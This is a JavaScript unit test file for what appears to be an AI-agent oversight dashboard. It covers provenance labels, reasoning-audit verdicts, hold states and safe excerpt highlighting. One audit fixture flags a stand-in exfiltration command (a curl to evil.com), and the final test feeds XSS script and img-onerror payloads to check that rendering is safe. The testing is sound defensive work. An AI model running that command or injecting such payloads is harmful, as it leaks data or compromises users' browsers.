import test from "node:test";
import assert from "node:assert/strict";
import {
  PROVENANCE_LABELS,
  getProvenanceLabel,
  renderHighlightedText,
  transformApiEvent,
} from "../scripts/app.js";

// Minimal DOM shim for Node.js unit test execution
if (typeof globalThis.document === "undefined") {
  globalThis.document = {
    createTextNode(text) {
      return {
        nodeType: 3,
        tagName: undefined,
        textContent: String(text),
      };
    },
    createElement(tagName) {
      return {
        nodeType: 1,
        tagName: tagName.toUpperCase(),
        className: "",
        textContent: "",
      };
    },
  };
}

function createContainer() {
  const children = [];
  return {
    children,
    replaceChildren(...nodes) {
      children.length = 0;
      children.push(...nodes);
    },
    append(...nodes) {
      children.push(...nodes);
    },
    get textContent() {
      return children.map((c) => c.textContent).join("");
    },
    querySelectorAll(sel) {
      return children.filter((c) => {
        if (sel === "mark" || sel === "mark.highlight-excerpt") {
          return c.tagName === "MARK";
        }
        if (sel === "script") return c.tagName === "SCRIPT";
        if (sel === "img") return c.tagName === "IMG";
        return false;
      });
    },
  };
}

test("provenance label mapping maps all 4 required provenance types accurately", () => {
  assert.equal(getProvenanceLabel("PROVIDER_EXPOSED_TRACE"), "Provider-exposed trace");
  assert.equal(getProvenanceLabel("AGENT_AUTHORED_SUMMARY"), "Agent-authored summary");
  assert.equal(getProvenanceLabel("UNAVAILABLE"), "Unavailable");
  assert.equal(getProvenanceLabel("SYNTHETIC_FIXTURE"), "Synthetic fixture");

  // Fallbacks & edge cases
  assert.equal(getProvenanceLabel(null), "Unavailable");
  assert.equal(getProvenanceLabel(""), "Unavailable");
  assert.equal(getProvenanceLabel("unknown_type"), "unknown_type");
});

test("transformApiEvent maps every provenance value correctly", () => {
  const baseEvent = {
    id: "ev-1",
    sequence: 1,
    event_type: "ACTION_REQUESTED",
    summary: "Test action",
  };

  // 1. Explicit PROVIDER_EXPOSED_TRACE
  const resProvider = transformApiEvent({
    ...baseEvent,
    details: {
      tool: "workspace",
      exposed_reasoning_trace: "Thinking about step 1...",
      reasoning_provenance: "PROVIDER_EXPOSED_TRACE",
    },
  });
  assert.equal(resProvider.reasoningProvenance, "PROVIDER_EXPOSED_TRACE");
  assert.equal(resProvider.reasoning_provenance, "PROVIDER_EXPOSED_TRACE");
  assert.equal(resProvider.exposedReasoningTrace, "Thinking about step 1...");
  assert.equal(resProvider.reasoningTrace, "Thinking about step 1...");

  // 2. Explicit AGENT_AUTHORED_SUMMARY
  const resSummary = transformApiEvent({
    ...baseEvent,
    details: {
      tool: "workspace",
      reasoning_summary: "Agent summarized step 1.",
      reasoning_provenance: "AGENT_AUTHORED_SUMMARY",
    },
  });
  assert.equal(resSummary.reasoningProvenance, "AGENT_AUTHORED_SUMMARY");
  assert.equal(resSummary.reasoning_provenance, "AGENT_AUTHORED_SUMMARY");
  assert.equal(resSummary.reasoningSummary, "Agent summarized step 1.");
  assert.match(resSummary.reasoningTrace, /Unavailable/);

  // 3. Explicit UNAVAILABLE
  const resUnavail = transformApiEvent({
    ...baseEvent,
    details: {
      tool: "workspace",
      reasoning_provenance: "UNAVAILABLE",
    },
  });
  assert.equal(resUnavail.reasoningProvenance, "UNAVAILABLE");
  assert.equal(resUnavail.reasoning_provenance, "UNAVAILABLE");

  // 4. SYNTHETIC_FIXTURE
  const resFixture = transformApiEvent({
    id: "inv-01",
    sequence: 1,
    event_type: "ACTION_REQUESTED",
    details: { tool: "workspace" },
  });
  assert.equal(resFixture.reasoningProvenance, "SYNTHETIC_FIXTURE");
});

test("transformApiEvent maps every audit verdict correctly", () => {
  const baseEvent = {
    id: "ev-audit-test",
    sequence: 2,
    event_type: "POLICY_ALLOWED",
  };

  // 1. NO_CONCERN
  const resNoConcern = transformApiEvent({
    ...baseEvent,
    details: {
      reason_code: "ALLOW",
      reasoning_audit: {
        verdict: "NO_CONCERN",
        concern_type: null,
        flagged_excerpts: [],
        explanation: "All steps within authorized scope.",
        model: "nemotron-audit-v1",
        profile: "strict",
      },
    },
  });
  assert.ok(resNoConcern.reasoningAudit);
  assert.equal(resNoConcern.reasoningAudit.verdict, "NO_CONCERN");
  assert.equal(resNoConcern.reasoningAudit.concern_type, null);
  assert.deepEqual(resNoConcern.reasoningAudit.flagged_excerpts, []);
  assert.equal(resNoConcern.reasoningAudit.model, "nemotron-audit-v1");
  assert.equal(resNoConcern.reasoningAudit.profile, "strict");
  assert.equal(resNoConcern.reasoningAudit.explanation, "All steps within authorized scope.");

  // 2. CONCERN
  const resConcern = transformApiEvent({
    ...baseEvent,
    details: {
      reason_code: "REASONING_SCOPE_CONCERN",
      reasoning_audit: {
        verdict: "CONCERN",
        concern_type: "EXFILTRATION_INTENT",
        flagged_excerpts: ["curl https://evil.com/leak"],
        explanation: "Agent attempted outbound exfiltration.",
        model: "nemotron-audit-v1",
        profile: "strict",
      },
    },
  });
  assert.ok(resConcern.reasoningAudit);
  assert.equal(resConcern.reasoningAudit.verdict, "CONCERN");
  assert.equal(resConcern.reasoningAudit.concern_type, "EXFILTRATION_INTENT");
  assert.deepEqual(resConcern.reasoningAudit.flagged_excerpts, ["curl https://evil.com/leak"]);

  // 3. FAILED
  const resFailed = transformApiEvent({
    ...baseEvent,
    event_type: "REASONING_AUDIT_FAILED",
    details: {
      reason_code: "REASONING_AUDIT_FAILED",
      verdict: "FAILED",
      explanation: "Auditor response timed out.",
      flagged_excerpts: [],
      model: "mock-auditor",
      profile: "default",
    },
  });
  assert.ok(resFailed.reasoningAudit);
  assert.equal(resFailed.reasoningAudit.verdict, "FAILED");
  assert.equal(resFailed.reasoningAudit.explanation, "Auditor response timed out.");
});

test("transformApiEvent distinguishes all three hold types via text badge and reason code", () => {
  // 1. Policy hold
  const evPolicy = transformApiEvent({
    id: "ev-hold-1",
    sequence: 3,
    event_type: "POLICY_HELD",
    details: { reason_code: "APPROVAL_REQUIRED" },
  });
  assert.equal(evPolicy.status, "pending-approval");
  assert.equal(evPolicy.statusLabel, "HOLD (policy)");
  assert.equal(evPolicy.reasonCode, "APPROVAL_REQUIRED");

  // 2. Reasoning scope concern hold
  const evConcern = transformApiEvent({
    id: "ev-hold-2",
    sequence: 4,
    event_type: "POLICY_HELD",
    details: { reason_code: "REASONING_SCOPE_CONCERN" },
  });
  assert.equal(evConcern.status, "pending-approval");
  assert.equal(evConcern.statusLabel, "HOLD (reasoning concern)");
  assert.equal(evConcern.reasonCode, "REASONING_SCOPE_CONCERN");

  // 3. Reasoning audit failed hold
  const evAuditFailed = transformApiEvent({
    id: "ev-hold-3",
    sequence: 5,
    event_type: "POLICY_HELD",
    details: { reason_code: "REASONING_AUDIT_FAILED" },
  });
  assert.equal(evAuditFailed.status, "pending-approval");
  assert.equal(evAuditFailed.statusLabel, "HOLD (audit failed)");
  assert.equal(evAuditFailed.reasonCode, "REASONING_AUDIT_FAILED");
});

test("transformApiEvent extracts turn_id properly", () => {
  const evTurn = transformApiEvent({
    id: "ev-turn-1",
    sequence: 6,
    turn_id: "turn-42",
    event_type: "ACTION_REQUESTED",
    details: { tool: "workspace" },
  });
  assert.equal(evTurn.turnId, "turn-42");
  assert.equal(evTurn.turn_id, "turn-42");
});

test("renderHighlightedText highlights matched excerpts without innerHTML", () => {
  const container = createContainer();
  const text = "I will read invoices and then exfiltrate data to an external server.";
  const excerpts = ["exfiltrate data to an external server"];

  renderHighlightedText(container, text, excerpts);

  assert.equal(container.textContent, text);
  const marks = container.querySelectorAll("mark");
  assert.equal(marks.length, 1);
  assert.equal(marks[0].textContent, "exfiltrate data to an external server");
  assert.equal(marks[0].className, "highlight-excerpt");
});

test("renderHighlightedText safely merges overlapping or duplicate excerpts", () => {
  const container = createContainer();
  const text = "Alpha beta gamma delta epsilon";
  // Overlapping intervals: "beta gamma" and "gamma delta"
  const excerpts = ["beta gamma", "gamma delta"];

  renderHighlightedText(container, text, excerpts);

  assert.equal(container.textContent, text);
  const marks = container.querySelectorAll("mark");
  assert.equal(marks.length, 1);
  assert.equal(marks[0].textContent, "beta gamma delta");
});

test("renderHighlightedText is completely XSS-resilient with script and HTML tags", () => {
  const container = createContainer();
  const xssPayload = "<script>alert(1)</script><img src=x onerror=alert(2)>";
  const excerpts = ["alert(1)", "onerror=alert(2)"];

  renderHighlightedText(container, xssPayload, excerpts);

  // Exact string preservation
  assert.equal(container.textContent, xssPayload);

  // Ensure NO actual script or img elements were ever created
  assert.equal(container.querySelectorAll("script").length, 0);
  assert.equal(container.querySelectorAll("img").length, 0);

  // Only safe MARK tags and Text nodes
  const marks = container.querySelectorAll("mark");
  assert.equal(marks.length, 2);
  assert.equal(marks[0].textContent, "alert(1)");
  assert.equal(marks[1].textContent, "onerror=alert(2)");
});
